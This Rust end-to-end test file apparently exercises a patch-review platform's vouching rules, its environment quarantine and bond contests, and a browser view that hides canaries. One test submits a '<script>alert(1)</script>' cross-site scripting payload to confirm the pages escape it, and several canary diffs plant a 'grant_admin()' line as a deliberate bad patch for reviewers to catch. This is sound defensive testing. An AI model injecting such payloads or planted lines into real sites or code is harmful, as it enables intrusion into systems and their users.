fn newcomers_wait_for_standing_or_a_vouch() {
    let api = Api::new();
    let run = format!(
        "v{:x}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_millis()
    );
    let upstream = format!("https://github.com/e2e/vouch-{run}");
    let src = lines(40, "x");
    let repo = Repo::new(&[("app.py", &src)]);
    let base = repo.base.clone();
    let (s, _) = api.call(
        "POST",
        "/v1/admin/pool",
        None,
        Some(json!({ "amount": 1000 })),
    );
    assert_eq!(s, 200);
    let op_id = |token: &str| api.me(token)["operator_id"].as_str().unwrap().to_string();
    let rep = |token: &str| api.me(token)["rep"].as_f64().unwrap();
    // The deltas of an operator's recent ledger entries with this reason.
    // (Rep alone is a noisy measure here: a reviewer's completion credit
    // for other tasks lands whenever their panels finish.)
    let deltas = |token: &str, reason: &str| -> Vec<f64> {
        api.me(token)["recent"]
            .as_array()
            .unwrap()
            .iter()
            .filter(|e| e["reason"] == reason)
            .map(|e| e["delta"].as_f64().unwrap())
            .collect()
    };
    let submit = |token: &str, intent: &str, from: &str, to: &str| {
        let (s, v) = api.call(
            "POST",
            "/v1/patches",
            Some(token),
            Some(json!({ "project": upstream,
            "intent": format!("{intent} ({run})"), "base_commit": base,
            "diff": repo.diff(&[("app.py", Some(src.replace(from, to)))]) })),
        );
        assert_eq!(s, 201, "{v}");
        (
            v["patch"]["id"].as_str().unwrap().to_string(),
            v["review_task"].as_str().unwrap().to_string(),
            v,
        )
    };
    let vouch = |token: &str, patch: &str| {
        api.call(
            "POST",
            &format!("/v1/patches/{patch}/vouch"),
            Some(token),
            None,
        )
    };
    let review_state = |patch: &str| {
        let (s, v) = api.call("GET", &format!("/v1/patches/{patch}"), None, None);
        assert_eq!(s, 200, "{v}");
        v["review"].as_str().unwrap_or_default().to_string()
    };
    // Reviews everything offered (reporting the marker where it appears)
    // and returns the task ids seen.
    let drain = |token: &str| {
        let mut seen = vec![];
        for _ in 0..100 {
            let (s, v) = api.call("POST", "/v1/reviews/next", Some(token), None);
            assert_eq!(s, 200, "{v}");
            let Some(task) = v["task"].as_object() else {
                break;
            };
            let id = task["task_id"].as_str().unwrap().to_string();
            let (s, v) = if task["phase"] == "run" {
                api.call(
                    "POST",
                    &format!("/v1/reviews/{id}/run"),
                    Some(token),
                    Some(json!({ "report": suite_report(true, true, 60_000) })),
                )
            } else {
                let issues: Value = marker_issues(task["diff"].as_str().unwrap()).into();
                api.call(
                    "POST",
                    &format!("/v1/reviews/{id}"),
                    Some(token),
                    Some(json!({ "issues": issues })),
                )
            };
            assert_eq!(s, 200, "{v}");
            seen.push(id);
        }
        seen
    };

    // A newcomer's patch is accepted and searchable, with its review pending.
    let nova = api.register(&format!("nova-{run}"));
    let (p1, t1, v) = submit(
        &nova,
        "Log the request id",
        "x 7\n",
        "x 7\nlog(request_id)\n",
    );
    assert_eq!(v["review"], "pending", "{v}");
    assert!(
        v["review_note"].as_str().unwrap().contains("vouch"),
        "the author is told how its review opens: {v}"
    );
    assert_eq!(review_state(&p1), "pending");
    let (_, found) = api.call(
        "POST",
        "/v1/search",
        None,
        Some(json!({ "project": upstream, "query": format!("log the request id ({run})") })),
    );
    assert_eq!(
        found["intents"][0]["patches"][0]["id"],
        json!(p1),
        "{found}"
    );

    // No reviewer is offered a pending task.
    let rex = api.register(&format!("rex-{run}"));
    assert!(
        !drain(&rex).contains(&t1),
        "a pending task is never offered"
    );

    // Vouching needs standing: a newcomer can't, and neither can a founder
    // with nothing to lend (genesis influence counts towards trust but
    // can't be lent).
    let nell = api.register(&format!("nell-{run}"));
    let (s, v) = vouch(&nell, &p1);
    assert_eq!(s, 403, "{v}");
    assert!(v["error"].as_str().unwrap().contains("standing"), "{v}");
    let fay = api.register(&format!("fay-{run}"));
    api.genesis(&format!("fay-{run}"));
    let (s, v) = vouch(&fay, &p1);
    assert_eq!(s, 403, "{v}");
    assert!(
        v["error"].as_str().unwrap().contains("can't be lent"),
        "{v}"
    );
    let (s, v) = vouch(&nova, &p1);
    assert_eq!(s, 403, "{v}");
    assert!(v["error"].as_str().unwrap().contains("your own"), "{v}");
    let (s, _) = vouch(&fay, "no-such-patch");
    assert_eq!(s, 404);

    // The founder earns rep by catching a canary, then vouches.
    let canary_src = src.replace("x 20\n", &format!("x 20\n{MARKER}\n"));
    let (s, v) = api.call(
        "POST",
        "/v1/admin/canaries",
        None,
        Some(json!({ "project": format!("{upstream}-decoy"), "base_commit": base, "intent": "Add a debug helper",
                     "diff": repo.diff(&[("app.py", Some(canary_src))]),
                     "planted": [{ "path": "app.py", "start": 21, "end": 21 }] })),
    );
    assert_eq!(s, 200, "{v}");
    drain(&fay);
    assert!(ledger_has(&api.me(&fay), "caught a canary"));
    let before = rep(&fay);
    let (s, v) = vouch(&fay, &p1);
    assert_eq!(s, 200, "{v}");
    assert_eq!(v["review"], "open", "{v}");
    assert_eq!(v["vouched_by"], json!(op_id(&fay)), "{v}");
    let after = rep(&fay);
    assert!(
        (before - after - 5.0).abs() < 0.05,
        "the loan is out of the voucher's rep: {before} -> {after}"
    );
    assert!(ledger_has(&api.me(&fay), "vouch_loan"));
    assert_eq!(review_state(&p1), "open");
    // Vouching again (here through MCP) changes nothing; nobody else can
    // vouch for a task that is no longer pending.
    let (s, v) = api.call(
        "POST",
        "/mcp",
        Some(&fay),
        Some(json!({ "jsonrpc": "2.0", "id": 1, "method": "tools/call",
            "params": { "name": "collective_vouch", "arguments": { "patch_id": p1 } } })),
    );
    assert_eq!(s, 200, "{v}");
    assert_ne!(v["result"]["isError"], true, "{v}");
    assert_eq!(deltas(&fay, "vouch_loan"), vec![-5.0], "one loan per task");
    let (s, v) = vouch(&nell, &p1);
    assert_eq!(s, 409, "{v}");

    // The voucher is never offered the task it vouched for.
    assert!(!drain(&fay).contains(&t1), "the voucher doesn't review it");

    // Three reviewers call it clean: the task resolves and the loan comes back.
    let reviewers: Vec<String> = (0..3)
        .map(|i| api.register(&format!("reviewer{i}-{run}")))
        .collect();
    for r in &reviewers {
        assert!(drain(r).contains(&t1), "an opened task is reviewed");
    }
    assert_eq!(review_state(&p1), "clean");
    assert_eq!(
        deltas(&fay, "vouch_returned"),
        vec![5.0],
        "returned in full, and nothing earned"
    );

    // A second vouched patch is found bad by a review quorum: the loan is lost.
    let nico = api.register(&format!("nico-{run}"));
    let (p2, t2, v) = submit(
        &nico,
        "Speed up login checks",
        "x 5\n",
        &format!("x 5\ndef login(user):\n    {MARKER}\n    return check(user)\n"),
    );
    assert_eq!(v["review"], "pending", "{v}");
    let (s, v) = vouch(&fay, &p2);
    assert_eq!(s, 200, "{v}");
    assert_eq!(deltas(&fay, "vouch_loan"), vec![-5.0, -5.0]);
    for r in &reviewers[..2] {
        assert!(drain(r).contains(&t2));
    }
    let (_, v) = api.call("GET", &format!("/v1/patches/{p2}"), None, None);
    assert_eq!(v["patch"]["status"], "quarantined", "{v}");
    let challenge = find_challenge(&api, &fay, &p2);
    let (s, v) = api.call(
        "POST",
        &format!("/v1/admin/challenges/{challenge}/resolve"),
        None,
        Some(json!({ "verdict": "problem", "via": "jury", "severity": "high", "intent": "accidental" })),
    );
    assert_eq!(s, 200, "{v}");
    assert_eq!(review_state(&p2), "graded");
    assert_eq!(
        deltas(&fay, "vouch_returned"),
        vec![5.0],
        "only the first loan came back: the second is lost"
    );

    // An author who earns standing gets its pending task opened by the
    // sweep on the next claim, without anyone asking.
    let gus = api.register(&format!("gus-{run}"));
    let (p3, _, v) = submit(&gus, "Retry failed uploads", "x 30\n", "x 30\nretry()\n");
    assert_eq!(v["review"], "pending", "{v}");
    api.genesis(&format!("gus-{run}"));
    assert_eq!(
        review_state(&p3),
        "pending",
        "nothing opens it until a claim"
    );
    let (s, v) = api.call("POST", "/v1/reviews/next", Some(&reviewers[2]), None);
    assert_eq!(s, 200, "{v}");
    assert_eq!(review_state(&p3), "open");
    // Finish what was claimed so the queue stays tidy for other tests.
    drain(&reviewers[2]);
    // An author with standing has its task open from the start.
    let hal = api.register(&format!("hal-{run}"));
    api.genesis(&format!("hal-{run}"));
    let (p4, _, v) = submit(&hal, "Retry failed downloads", "x 31\n", "x 31\nretry()\n");
    assert_eq!(v["review"], "open", "{v}");
    assert!(v.get("review_note").is_none(), "{v}");
    assert_eq!(review_state(&p4), "open");
}

/// Quarantine (ENVIRONMENTS.md): an admin quarantines a project's current
/// environment and the project becomes review-only: patches are accepted
/// with review-only tasks and proofs are refused. Operators with standing
/// contest it with bonds; a quorum of stakes settles it, and the losers'
/// bonds go to the winners. An admin can also lift it directly.
#[test]
#[ignore = "needs a running Worker; see module docs"]
fn environments_are_quarantined_and_contested() {
    let api = Api::new();
    let run = format!(
        "z{:x}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_millis()
    );
    let upstream = format!("https://github.com/e2e/quarantine-{run}");
    let project_path = upstream.replace("https://", "").replace('/', "%2F");
    let add = "#!/bin/sh\necho $(($1 + $2))\n";
    let test = "#!/bin/sh\n[ \"$(sh add.sh 2 3)\" = 5 ] || exit 1\n";
    let repo = Repo::new(&[("add.sh", add), ("test.sh", test)]);
    let base = repo.base.clone();
    let deltas = |token: &str, reason: &str| -> Vec<f64> {
        api.me(token)["recent"]
            .as_array()
            .unwrap()
            .iter()
            .filter(|e| e["reason"] == reason)
            .map(|e| (e["delta"].as_f64().unwrap() * 100.0).round() / 100.0)
            .collect()
    };
    let envs = || {
        api.call(
            "GET",
            &format!("/v1/projects/{project_path}/environments"),
            None,
            None,
        )
        .1
    };
    let contest = |token: &str, version: u64, side: &str| {
        api.call(
            "POST",
            &format!("/v1/projects/{project_path}/environments/{version}/contest"),
            Some(token),
            Some(json!({ "side": side })),
        )
    };
    let admin = |action: &str, body: Value| {
        api.call(
            "POST",
            &format!("/v1/admin/projects/{project_path}/environment/{action}"),
            None,
            Some(body),
        )
    };
    // Registered from a documentation-range address of their own
    // (Cloudflare sets this header at the edge; local dev honors it), as
    // identity.rs does, so this test doesn't spend the other tests' share
    // of the per-network registration limit.
    let register = |operator: &str| -> String {
        let r = ureq::post(&format!("{}/v1/register", api.base))
            .set("cf-connecting-ip", "203.0.113.77")
            .send_json(json!({ "operator": operator, "agent_name": "bot" }));
        let v: Value = match r {
            Ok(r) => r.into_json().unwrap(),
            Err(e) => panic!("register {operator}: {e}"),
        };
        v["token"].as_str().unwrap().to_string()
    };
    let founder = |name: &str| {
        let token = register(&format!("{name}-{run}"));
        api.genesis(&format!("{name}-{run}"));
        token
    };

    // A project with a suite and an adopted Nix environment.
    let author = founder("author");
    // Each submission owes review duty, so each patch has its own author.
    let submit = |token: &str, intent: &str, line: &str| {
        let (s, v) = api.call(
            "POST",
            "/v1/patches",
            Some(token),
            Some(json!({ "project": upstream, "intent": format!("{intent} ({run})"), "base_commit": base,
                "diff": repo.diff(&[("add.sh", Some(format!("{add}{line}\n")))]) })),
        );
        assert_eq!(s, 201, "{v}");
        v
    };
    submit(&author, "Comment the adder", "# adds");
    let (s, v) = api.call(
        "PUT",
        &format!("/v1/admin/projects/{project_path}/run"),
        None,
        Some(
            json!({ "ecosystem": "none", "tests": ["test.sh"], "repeats": 1, "timeout_secs": 60 }),
        ),
    );
    assert_eq!(s, 200, "{v}");
    let record = json!({ "nix": { "nixpkgs": "0123456789abcdef0123456789abcdef01234567", "packages": ["hello", "jq"] } });
    let (s, v) = api.call(
        "PUT",
        &format!("/v1/admin/projects/{project_path}/environment"),
        None,
        Some(record.clone()),
    );
    assert_eq!(s, 200, "{v}");
    let env_id = v["current"]["id"].as_str().unwrap().to_string();
    let version = v["versions"][0]["version"].as_u64().unwrap();

    // Only an admin quarantines, and only with a reason.
    let (s, _) = api.call(
        "POST",
        &format!("/v1/projects/{project_path}/environments/{version}/contest"),
        Some(&author),
        Some(json!({ "side": "lift" })),
    );
    assert_eq!(s, 409, "nothing to contest before a quarantine");
    let (s, v) = admin("quarantine", json!({}));
    assert_eq!(s, 400, "{v}");
    let reason = format!("hello pins a suspicious build ({run})");
    let (s, v) = admin("quarantine", json!({ "reason": reason }));
    assert_eq!(s, 200, "{v}");
    assert_eq!(v["current"]["state"], "quarantined", "{v}");
    assert_eq!(v["current"]["quarantine_reason"], json!(reason), "{v}");
    assert_eq!(
        v["versions"][0]["quarantine"]["reason"],
        json!(reason),
        "{v}"
    );
    assert_eq!(
        v["versions"][0]["quarantine"]["contest_settled"],
        Value::Null,
        "{v}"
    );
    let (s, v) = admin("quarantine", json!({ "reason": "again" }));
    assert_eq!(s, 409, "{v}");

    // Patches are still accepted; their tasks are review-only.
    let keeper = founder("keeper");
    let lifters: Vec<String> = (0..3).map(|i| founder(&format!("lifter{i}"))).collect();
    let v = submit(&keeper, "Document the adder", "# returns the sum");
    let patch = v["patch"]["id"].as_str().unwrap().to_string();
    let task = v["review_task"].as_str().unwrap().to_string();
    assert!(
        v["review_only"].as_str().unwrap().contains(&reason),
        "the author is told why: {v}"
    );

    // Proofs are refused, with the reason.
    let newcomer = register(&format!("newcomer-{run}"));
    let challenge = api.report(&newcomer, &patch);
    let (s, v) = api.call(
        "POST",
        &format!("/v1/challenges/{challenge}/proofs"),
        Some(&newcomer),
        Some(json!({ "kind": "regression", "tests": ["test.sh"] })),
    );
    assert_eq!(s, 409, "{v}");
    assert!(
        v["error"].as_str().unwrap().contains(&reason),
        "the refusal gives the reason: {v}"
    );

    // Contesting needs standing, and a bond from ledger rep.
    let (s, v) = contest(&newcomer, version, "lift");
    assert_eq!(s, 403, "{v}");
    assert!(v["error"].as_str().unwrap().contains("standing"), "{v}");
    let (s, v) = contest(&keeper, version, "keep");
    assert_eq!(s, 402, "genesis influence can't be staked: {v}");
    let (s, _) = contest(&keeper, 999, "keep");
    assert_eq!(s, 404);
    let (s, v) = contest(&keeper, version, "maybe");
    assert_eq!(s, 400, "{v}");

    // The stakers earn rep by catching canaries; while draining with Nix
    // they also see the quarantined project's task, which has no run phase.
    let src = lines(40, "x");
    let decoy = Repo::new(&[("app.py", &src)]);
    let mut saw_task = false;
    let mut drain = |token: &str| {
        for _ in 0..100 {
            let (s, v) = api.call(
                "POST",
                "/v1/reviews/next?capabilities=nix",
                Some(token),
                None,
            );
            assert_eq!(s, 200, "{v}");
            let Some(t) = v["task"].as_object() else {
                break;
            };
            let id = t["task_id"].as_str().unwrap().to_string();
            if t["phase"] == "run" {
                let (s, v) = api.call(
                    "POST",
                    &format!("/v1/reviews/{id}/run"),
                    Some(token),
                    Some(json!({ "report": suite_report(true, true, 60_000) })),
                );
                assert_eq!(s, 200, "{v}");
                continue;
            }
            let issues: Value = marker_issues(t["diff"].as_str().unwrap()).into();
            let (s, v) = api.call(
                "POST",
                &format!("/v1/reviews/{id}"),
                Some(token),
                Some(json!({ "issues": issues })),
            );
            assert_eq!(s, 200, "{v}");
            if id == task {
                assert!(t["run"].is_null(), "review-only: no run spec: {t:?}");
                assert_eq!(t["units"]["run"], 0, "{t:?}");
                assert_eq!(v["next"]["phase"], "done", "no run phase: {v}");
                saw_task = true;
            }
        }
    };
    let stakers: Vec<&String> = std::iter::once(&keeper).chain(lifters.iter()).collect();
    for (i, token) in stakers.iter().enumerate() {
        let line = 10 + i;
        let (s, v) = api.call(
            "POST",
            "/v1/admin/canaries",
            None,
            Some(json!({ "project": format!("{upstream}-decoy"), "base_commit": decoy.base, "intent": "Add a debug helper",
                "diff": decoy.diff(&[("app.py", Some(src.replace(&format!("x {line}\n"), &format!("x {line}\n{MARKER}\n"))))]),
                "planted": [{ "path": "app.py", "start": line + 1, "end": line + 1 }] })),
        );
        assert_eq!(s, 200, "{v}");
        drain(token);
        assert!(
            ledger_has(&api.me(token), "caught a canary"),
            "staker {i} earned rep"
        );
    }
    assert!(saw_task, "a staker reviewed the review-only task");

    // A keeper and three lifters stake; the third lift settles it.
    let (s, v) = contest(&keeper, version, "keep");
    assert_eq!(s, 200, "{v}");
    assert_eq!(v["staked"]["settled"], Value::Null, "{v}");
    assert_eq!(deltas(&keeper, "contest_bond"), vec![-5.0]);
    // One stake per operator (here through MCP, which shares the route).
    let (s, v) = api.call(
        "POST",
        "/mcp",
        Some(&keeper),
        Some(json!({ "jsonrpc": "2.0", "id": 1, "method": "tools/call",
            "params": { "name": "collective_environment_contest", "arguments": { "project": upstream, "version": version, "side": "lift" } } })),
    );
    assert_eq!(s, 200, "{v}");
    assert_eq!(v["result"]["isError"], true, "{v}");
    assert!(
        v["result"]["content"][0]["text"]
            .as_str()
            .unwrap()
            .contains("already staked"),
        "{v}"
    );
    for l in &lifters[..2] {
        let (s, v) = contest(l, version, "lift");
        assert_eq!(s, 200, "{v}");
        assert_eq!(v["staked"]["settled"], Value::Null, "{v}");
    }
    assert_eq!(envs()["current"]["state"], "quarantined");
    let (s, v) = contest(&lifters[2], version, "lift");
    assert_eq!(s, 200, "{v}");
    assert_eq!(v["staked"]["settled"], "lift", "{v}");
    let v = envs();
    assert_eq!(v["current"]["id"], json!(env_id), "{v}");
    assert_eq!(v["current"]["state"], "adopted", "runs resume: {v}");
    let q = &v["versions"][0]["quarantine"];
    assert_eq!(q["contest_settled"], "lift", "{v}");
    assert_eq!(q["lifted_by"], "contest", "{v}");
    assert_eq!(q["reason"], json!(reason), "kept as history: {v}");
    assert_eq!(q["stakes"].as_array().unwrap().len(), 4, "{v}");
    for l in &lifters {
        assert_eq!(deltas(l, "contest_bond"), vec![-5.0]);
        assert_eq!(
            deltas(l, "contest_won"),
            vec![6.67],
            "bond back plus a third of the keeper's"
        );
    }
    assert!(
        deltas(&keeper, "contest_won").is_empty() && deltas(&keeper, "contest_returned").is_empty(),
        "the keeper's bond is forfeited"
    );
    let (s, v) = contest(&keeper, version, "keep");
    assert_eq!(s, 409, "no longer quarantined: {v}");

    // Quarantined again: a new contest, which a quorum settles `keep`.
    // After that the contest is closed, and only an admin can lift it.
    let (s, v) = admin("quarantine", json!({ "reason": "jq too" }));
    assert_eq!(s, 200, "{v}");
    assert_eq!(
        v["versions"][0]["quarantine"]["stakes"],
        json!([]),
        "a new quarantine starts a new contest: {v}"
    );
    for l in &lifters {
        let (s, v) = contest(l, version, "keep");
        assert_eq!(s, 200, "{v}");
    }
    let v = envs();
    assert_eq!(v["current"]["state"], "quarantined", "{v}");
    assert_eq!(v["versions"][0]["quarantine"]["contest_settled"], "keep");
    for l in &lifters {
        assert_eq!(
            deltas(l, "contest_won"),
            vec![5.0, 6.67],
            "no losers: bonds back"
        );
    }
    let (s, v) = contest(&keeper, version, "lift");
    assert_eq!(s, 409, "{v}");
    assert!(v["error"].as_str().unwrap().contains("settled"), "{v}");
    let (s, v) = admin("lift", json!({}));
    assert_eq!(s, 200, "{v}");
    assert_eq!(v["current"]["state"], "adopted", "{v}");
    assert_eq!(v["versions"][0]["quarantine"]["lifted_by"], "admin", "{v}");
    assert_eq!(v["versions"][0]["quarantine"]["contest_settled"], "keep");
    let (s, _) = admin("lift", json!({}));
    assert_eq!(s, 409, "nothing left to lift");

    // An admin's lift before any quorum returns the stakes in full.
    let (s, v) = admin("quarantine", json!({ "reason": "one more look" }));
    assert_eq!(s, 200, "{v}");
    let (s, v) = contest(&keeper, version, "keep");
    assert_eq!(s, 200, "{v}");
    let (s, v) = admin("lift", json!({}));
    assert_eq!(s, 200, "{v}");
    assert_eq!(v["versions"][0]["quarantine"]["contest_settled"], "admin");
    assert_eq!(deltas(&keeper, "contest_returned"), vec![5.0]);
    assert_eq!(deltas(&keeper, "contest_bond"), vec![-5.0, -5.0]);
}

#[test]
#[ignore]
fn the_browser_shows_public_work_and_hides_canaries() {
    let api = Api::new();
    let run = format!(
        "b{:x}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_millis()
    );
    let upstream = format!("https://github.com/e2e/browse-{run}");
    let page = |path: &str| -> (u16, String) {
        let (s, v) = api.call("GET", path, None, None);
        (s, v.as_str().map(str::to_string).unwrap_or_default())
    };
    let src = lines(40, "x");
    let repo = Repo::new(&[("app.py", &src)]);
    let base = repo.base.clone();

    // A patch whose title and diff try to inject markup.
    let author = api.register(&format!("author-{run}"));
    let adopter = api.register(&format!("adopter-{run}"));
    api.genesis(&format!("author-{run}"));
    let hostile = "<script>alert(1)</script>";
    let (s, v) = api.call(
        "POST",
        "/v1/patches",
        Some(&author),
        Some(json!({ "project": upstream, "intent": format!("Greet {run} {hostile}"), "title": format!("Greet {hostile}"),
                     "base_commit": base, "diff": repo.diff(&[("app.py", Some(src.replace("x 3\n", &format!("x 3\n{hostile}\n"))))]) })),
    );
    assert_eq!(s, 201, "{v}");
    let patch = v["patch"]["id"].as_str().unwrap().to_string();
    let (s, v) = api.call(
        "POST",
        &format!("/v1/patches/{patch}/adoptions"),
        Some(&adopter),
        Some(json!({ "outcome": "shipped" })),
    );
    assert_eq!(s, 201, "{v}");

    // A canary on a project that has nothing else.
    let decoy = format!("{upstream}-decoy");
    let canary_diff = repo.diff(&[("app.py", Some(src.replace("x 9\n", "x 9\ngrant_admin()\n")))]);
    let (s, v) = api.call(
        "POST",
        "/v1/admin/canaries",
        None,
        Some(json!({ "project": decoy, "base_commit": base, "intent": format!("Canary {run}"), "diff": canary_diff,
                     "planted": [{ "path": "app.py", "start": 10, "end": 10 }] })),
    );
    assert_eq!(s, 200, "{v}");
    let canary = v["canary_patch"].as_str().unwrap().to_string();

    let project_path = format!("/browse/p/{}", upstream.trim_start_matches("https://"));
    for path in [
        "/browse".to_string(),
        "/browse/rep".to_string(),
        project_path.clone(),
        format!("/browse/patches/{patch}"),
        format!("/browse/operators/author-{run}"),
    ] {
        let (s, html) = page(&path);
        assert_eq!(s, 200, "{path}: {html}");
        assert!(!html.contains(hostile), "{path} renders participant markup");
        assert!(
            !html.contains(&format!("Canary {run}")),
            "{path} shows the canary"
        );
        assert!(
            !html.contains("-decoy"),
            "{path} shows the canary's project"
        );
    }
    let (_, html) = page(&format!("/browse/patches/{patch}"));
    assert!(html.contains("Greet &lt;script&gt;"), "{html}");
    assert!(html.contains("shipped"), "the adoption outcome is shown");
    let (_, html) = page(&project_path);
    assert!(html.contains(&format!("/browse/patches/{patch}")), "{html}");

    // Canaries, and projects that hold only canaries, look like nothing at all.
    for path in [
        format!("/browse/patches/{canary}"),
        format!("/browse/p/{}", decoy.trim_start_matches("https://")),
        "/browse/operators/platform".to_string(),
    ] {
        let (s, _) = page(&path);
        assert_eq!(s, 404, "{path}");
    }

    // Rep and trust are public; the ledger is not.
    let (s, v) = api.call("GET", &format!("/v1/operators/author-{run}"), None, None);
    assert_eq!(s, 200, "{v}");
    assert!(
        v["rep"].is_number() && v["trust"].as_f64().unwrap() > 0.25,
        "{v}"
    );
    assert!(v.get("recent").is_none(), "{v}");
}
